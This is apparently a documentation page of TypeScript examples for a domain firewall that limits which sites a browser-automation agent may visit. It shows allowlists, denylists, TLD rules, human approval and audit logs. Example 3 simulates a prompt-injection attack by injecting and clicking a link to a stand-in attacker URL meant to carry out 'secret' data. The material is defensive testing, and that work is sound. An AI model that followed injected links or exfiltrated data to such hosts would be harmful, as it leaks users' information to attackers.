# Domain Firewall Examples

Practical patterns for using the CDP domain firewall with composable policies.

## Example 1: Basic Allowlist

**User request**: "Lock my agent to only browse Wikipedia and GitHub"

```typescript
import { Stagehand } from "@browserbasehq/stagehand";
import { installDomainFirewall, allowlist } from "./domain-firewall";

const stagehand = new Stagehand({ env: "BROWSERBASE" });
await stagehand.init();
const page = stagehand.context.pages()[0];

await installDomainFirewall(page, {
  policies: [
    allowlist(["wikipedia.org", "en.wikipedia.org", "github.com"]),
  ],
  defaultVerdict: "deny",
});

// These work:
await page.goto("https://en.wikipedia.org/wiki/Node.js");
await page.goto("https://github.com/browserbase/stagehand");

// This is blocked:
await page.goto("https://example.com").catch(() => {
  console.log("Denied — not in allowlist");
});

await stagehand.close();
```

## Example 2: Human-in-the-Loop Approval (stdin)

**User request**: "Let the agent browse, but ask me before it visits unknown domains"

The browser freezes on the current page while the terminal waits for your `y`/`n` input.

```typescript
import * as readline from "readline/promises";
import {
  installDomainFirewall,
  allowlist,
  interactive,
  type NavigationRequest,
} from "./domain-firewall";

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

const promptUser = async (req: NavigationRequest): Promise<"allow" | "deny"> => {
  console.log(`\n  Agent wants to visit: ${req.domain}`);
  console.log(`  URL: ${req.url}`);
  const answer = await rl.question("  Allow? (y/n): ");
  return answer.trim().toLowerCase().startsWith("y") ? "allow" : "deny";
};

await installDomainFirewall(page, {
  policies: [
    allowlist(["en.wikipedia.org"]),                                    // known-good: instant
    interactive(promptUser, { timeoutMs: 60000, onTimeout: "deny" }),   // unknown: ask operator
  ],
  defaultVerdict: "deny",
});

// Wikipedia: passes through instantly (allowlist)
await page.goto("https://en.wikipedia.org/wiki/Web_browser");

// example.com: held → terminal prompts "Allow? (y/n):" → you decide
const result = await page
  .goto("https://example.com", { timeoutMs: 65000 })
  .catch((e: any) => e);

if (result instanceof Error) {
  console.log("You denied the navigation");
} else {
  console.log(`Approved — now on: ${page.url()}`);
}

// Don't forget to close readline when done
rl.close();
```

## Example 3: Catching Malicious Link Clicks

**User request**: "Protect my agent against prompt injection links on untrusted pages"

The firewall catches navigations from DOM clicks — not just `page.goto()`.

```typescript
import { installDomainFirewall, allowlist, denylist } from "./domain-firewall";

await installDomainFirewall(page, {
  policies: [
    denylist(["evil-site.com", "phishing.com"]),
    allowlist(["en.wikipedia.org"]),
  ],
  defaultVerdict: "deny",
});

// Navigate to a trusted page
await page.goto("https://en.wikipedia.org/wiki/Web_browser", {
  waitUntil: "domcontentloaded",
});

// Simulate a malicious link injected into the page (e.g. via prompt injection)
await page.sendCDP("Runtime.evaluate", {
  expression: `
    const link = document.createElement("a");
    link.href = "https://evil-site.com/steal?data=secret";
    link.id = "malicious-link";
    link.textContent = "Click here for more info";
    document.body.prepend(link);
  `,
});

// When the agent clicks this link, the firewall catches it
await page.sendCDP("Runtime.evaluate", {
  expression: `document.getElementById("malicious-link").click()`,
});

await new Promise((r) => setTimeout(r, 500));
console.log(`URL after click: ${page.url()}`);
// Still on Wikipedia — the malicious navigation was blocked by denylist policy
```

## Example 4: TLD and Pattern Rules

**User request**: "Allow educational and open-source domains, block suspicious TLDs, and allow all GitHub subdomains"

```typescript
import {
  installDomainFirewall,
  denylist,
  allowlist,
  tld,
  pattern,
} from "./domain-firewall";

await installDomainFirewall(page, {
  policies: [
    denylist(["evil.com"]),                                // 1. known-bad
    allowlist(["github.com"]),                             // 2. known-good
    pattern(["*.github.com", "*.githubusercontent.com"], "allow"),  // 3. GitHub subdomains
    tld({ ".org": "allow", ".edu": "allow", ".gov": "allow" }),    // 4. trusted TLDs
    pattern(["*.ru", "*.cn"], "deny"),                     // 5. suspicious patterns
  ],
  defaultVerdict: "deny",
});

// github.com → allowed (allowlist)
// raw.githubusercontent.com → allowed (pattern)
// mozilla.org → allowed (tld: .org)
// mit.edu → allowed (tld: .edu)
// sketchy.ru → denied (pattern: *.ru)
// example.com → denied (default)
```

## Example 5: Audit Log with Policy Attribution

**User request**: "Log all navigation attempts and show which policy decided each one"

```typescript
import {
  installDomainFirewall,
  denylist,
  allowlist,
  tld,
  type AuditEntry,
} from "./domain-firewall";

const auditLog: AuditEntry[] = [];

await installDomainFirewall(page, {
  policies: [
    denylist(["evil.com"]),
    allowlist(["en.wikipedia.org", "github.com"]),
    tld({ ".org": "allow" }),
  ],
  defaultVerdict: "deny",
  auditLog,
});

// ... agent performs browsing tasks ...

// Print audit report
console.log("\n=== Navigation Audit Report ===\n");

for (const entry of auditLog) {
  const icon = entry.action === "ALLOWED" ? "PASS" : "DENY";
  console.log(
    `[${entry.time}] ${icon.padEnd(5)} ${entry.domain.padEnd(30)} decided by: ${entry.decidedBy}`,
  );
}
// Example output:
//   [14:23:01] PASS  en.wikipedia.org               decided by: allowlist
//   [14:23:05] PASS  github.com                     decided by: allowlist
//   [14:23:08] DENY  evil.com                       decided by: denylist
//   [14:23:10] PASS  mozilla.org                    decided by: tld
//   [14:23:12] DENY  example.com                    decided by: default
```

## Example 6: Full Policy Chain

**User request**: "Set up comprehensive navigation security with known-bad blocking, known-good allowing, TLD rules, and human approval as a fallback"

```typescript
import {
  installDomainFirewall,
  denylist,
  allowlist,
  tld,
  pattern,
  interactive,
  type AuditEntry,
} from "./domain-firewall";

const auditLog: AuditEntry[] = [];

await installDomainFirewall(page, {
  policies: [
    // Layer 1: Hard deny known-bad domains (instant)
    denylist(["evil.com", "phishing-site.com", "malware.download"]),

    // Layer 2: Allow known-good domains (instant)
    allowlist([
      "en.wikipedia.org",
      "github.com",
      "docs.google.com",
    ]),

    // Layer 3: Allow GitHub ecosystem subdomains (instant)
    pattern(["*.github.com", "*.githubusercontent.com"], "allow"),

    // Layer 4: Allow trusted TLDs (instant)
    tld({ ".org": "allow", ".edu": "allow", ".gov": "allow" }),

    // Layer 5: Block suspicious TLD patterns (instant)
    pattern(["*.ru", "*.cn", "*.tk"], "deny"),

    // Layer 6: Everything else — ask the operator via stdin (60s timeout)
    interactive(
      async (req) => {
        console.log(`\n  Unknown domain: ${req.domain} (${req.url})`);
        const answer = await rl.question("  Allow? (y/n): ");
        return answer.trim().toLowerCase().startsWith("y") ? "allow" : "deny";
      },
      { timeoutMs: 60000, onTimeout: "deny" },
    ),
  ],
  defaultVerdict: "deny",
  auditLog,
});
```

**Policy evaluation flow for `docs.google.com`**:
1. denylist → abstain (not in list)
2. allowlist → allow (match!)

**Policy evaluation flow for `unknown-site.xyz`**:
1. denylist → abstain
2. allowlist → abstain
3. pattern:allow → abstain
4. tld → abstain (`.xyz` not in rules)
5. pattern:deny → abstain (not `*.ru`/`*.cn`/`*.tk`)
6. interactive → asks human → "deny" (or timeout → "deny")

## Tips

- **Policy order is your security model**: Put denylists first (fail-fast for known threats), then allowlists, then broad rules (TLD/pattern), then interactive as the last resort.
- **Subdomain coverage**: `allowlist(["github.com"])` does NOT match `api.github.com`. Use `pattern(["*.github.com"], "allow")` for subdomains.
- **Custom policies are easy**: Any `{ name, evaluate }` object works. Use this for time-based rules, rate limiting, or domain reputation lookups.
- **Production timeout pattern**: Always set `timeoutMs` on `interactive()`. A request held indefinitely ties up browser resources.
- **Testing your firewall**: Use `page.sendCDP("Runtime.evaluate")` to inject links and click them programmatically, as shown in Example 3. This simulates prompt injection.
- **Audit log for debugging**: If a navigation is unexpectedly blocked or allowed, check `decidedBy` in the audit log to see which policy made the decision.
